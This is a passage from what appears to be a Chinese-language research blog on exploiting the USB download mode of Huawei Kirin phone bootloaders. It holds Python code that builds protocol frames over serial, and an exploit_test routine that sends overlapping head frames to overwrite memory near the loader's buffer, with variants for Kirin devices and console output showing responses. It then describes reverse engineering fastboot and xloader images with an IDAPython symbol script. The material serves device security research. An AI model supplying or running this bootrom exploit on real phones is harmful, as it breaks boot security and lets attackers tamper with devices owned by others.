</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">image_size</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">address</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        payload = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.head_chunk_cmd
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq)+</span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(~</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># file_type
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(image_size)
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(address)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_frame</span><span style="color:#c0c5ce;">(payload)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">address != </span><span style="color:#d08770;">0x22000</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq-=</span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        payload = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.data_chunk_cmd
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq)+</span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(~</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        payload+= data
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_frame</span><span style="color:#c0c5ce;">(payload)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_tail_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        payload = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.tail_chunk_cmd
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq)+</span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(~</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_frame</span><span style="color:#c0c5ce;">(payload)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        payload = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.inquiry_chunk_cmd
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq)+</span><span style="color:#8fa1b3;">p8</span><span style="color:#c0c5ce;">(~</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_frame</span><span style="color:#c0c5ce;">(payload)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq-=</span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">start_send_image</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_size, </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.address)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_sned_image_size &gt; </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_sned_image_size-=</span><span style="color:#d08770;">0x400
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_send_image_data[:</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">])
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_send_image_data = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_send_image_data[</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">:]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_sned_image_size &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_send_image_data)
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">send_tail_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">payload</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq+=</span><span style="color:#d08770;">1
</span><span style="color:#c0c5ce;">        payload+= </span><span style="color:#8fa1b3;">p16</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">get_check_sum</span><span style="color:#c0c5ce;">(payload))
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[</span><span style="color:#c0c5ce;">{</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq}</span><span style="color:#a3be8c;">] </span><span style="color:#c0c5ce;">{binascii.</span><span style="color:#8fa1b3;">b2a_hex</span><span style="color:#c0c5ce;">(payload).</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] send </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">putc</span><span style="color:#c0c5ce;">(payload))}</span><span style="color:#a3be8c;"> bytes</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] received: </span><span style="color:#c0c5ce;">{</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">getc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">)}&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">except</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;"># exit normal
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] done</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># input()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.ser.is_open:
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Closing serial port</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.ser.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Serial port already closed</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">normal_test</span><span style="color:#c0c5ce;">():
</span><span style="color:#c0c5ce;">    hw = </span><span style="color:#8fa1b3;">Huawei</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">set_image</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">+</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">start_send_image</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exploit_test</span><span style="color:#c0c5ce;">():
</span><span style="color:#c0c5ce;">    hw = </span><span style="color:#8fa1b3;">Huawei</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x10000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x10000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x21e04</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">normal_test</span><span style="color:#c0c5ce;">()
</span><span style="color:#65737e;"># exploit_test()
</span></pre>
<p>回显：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PS C:\Users\ayoung\Desktop\hwp40\test_poc&gt; python .\test2.py
</span><span style="color:#c0c5ce;">[1] fe00ff010000042000022000de33
</span><span style="color:#c0c5ce;">[+] send 0xe bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\xaa&#39;
</span><span style="color:#c0c5ce;">[2] da01fe414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412509
</span><span style="color:#c0c5ce;">[+] send 0x405 bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\xaa&#39;
</span><span style="color:#c0c5ce;">[3] da02fd424242424242424242424242424242424242424242424242424242424242424270db
</span><span style="color:#c0c5ce;">[+] send 0x25 bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\xaa&#39;
</span><span style="color:#c0c5ce;">[4] cd03fc1f66
</span><span style="color:#c0c5ce;">[+] send 0x5 bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\x1c\xf1\xf1\x1f&#39;
</span><span style="color:#c0c5ce;">[5] ed04fb70d0
</span><span style="color:#c0c5ce;">[+] send 0x5 bytes
</span><span style="color:#c0c5ce;">[+] done
</span><span style="color:#c0c5ce;">[+] Closing serial port
</span></pre>
<p>mate20 kirin980</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exploit_test</span><span style="color:#c0c5ce;">():
</span><span style="color:#c0c5ce;">    hw = </span><span style="color:#8fa1b3;">Huawei</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x20000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22000</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_head_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x20000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x21e00</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># for i in range(1:
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_data_frame</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">send_inquiry_frame</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    hw.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[12] cd0bf417c7
</span><span style="color:#c0c5ce;">[+] send 0x5 bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\x1cZZZ&#39;
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[2] cd01fe5946
</span><span style="color:#c0c5ce;">[+] send 0x5 bytes
</span><span style="color:#c0c5ce;">[+] received: b&#39;\x1cAAA&#39;
</span></pre>
<h2 id="ni-xiang">逆向</h2><h3 id="fastboot">fastboot</h3><p>发现尾部存在符号表 dump出来</p>
<p><code>fastboot.img</code>拖IDA，选arm小端
如下修正ROM起始地址、加载地址及文件偏移
<img src="./images/Pasted%20image%2020241210204948.png" alt="" /></p>
<blockquote>
<p>起始地址及加载地址从符号表文件获取
<code>000000001ac00000 l    d  .text	0000000000000000 .text</code></p>
</blockquote>
<blockquote>
<p>文件偏移设置出于两点：</p>
<ol>
<li>阅读议题白皮书提到xloader存在0x1000大小的vrl header</li>
<li>未设置时，通过按末12bit搜索函数对照 发现偏移差0x1000</li>
</ol>
</blockquote>
<p>通过idapython脚本批量恢复符号，script file加载
（来源：<a href="https://github.com/map220v/kirin710_bootrom_exploit/tree/master">GitHub - map220v/kirin710_bootrom_exploit: Tested on Honor 8x</a>）</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">idc
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">idautils
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">idaapi
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">line </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">xloader_symbols.txt</span><span style="color:#c0c5ce;">&quot;,&#39;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&#39;):
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(int(line[:</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), line[</span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">47</span><span style="color:#c0c5ce;">], line[</span><span style="color:#d08770;">48</span><span style="color:#c0c5ce;">:].</span><span style="color:#8fa1b3;">strip</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">    idaapi.</span><span style="color:#8fa1b3;">set_name</span><span style="color:#c0c5ce;">(int(line[:</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), line[</span><span style="color:#d08770;">48</span><span style="color:#c0c5ce;">:].</span><span style="color:#8fa1b3;">strip</span><span style="color:#c0c5ce;">(), idaapi.</span><span style="color:#bf616a;">SN_FORCE</span><span style="color:#c0c5ce;">)
</span></pre>
<p>XLOADER.img
发现ghidra可以反编译
<img src="./images/Pasted%20image%2020250218171640.png" alt="" />
其实得选arm 小端 32位的</p>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#yi-xie-wang-zhi">一些网址</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#usb-download-mode">usb download mode</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xmodem-protocol">xmodem protocol</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#potatonv">PotatoNV</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#potatonv-next-xie-yi-shi-xian">potatoNV-next 协议实现</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#jiao-hu-jiao-ben">交互脚本</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ni-xiang">逆向</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#fastboot">fastboot</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="script.js"></script>
</body>
</html>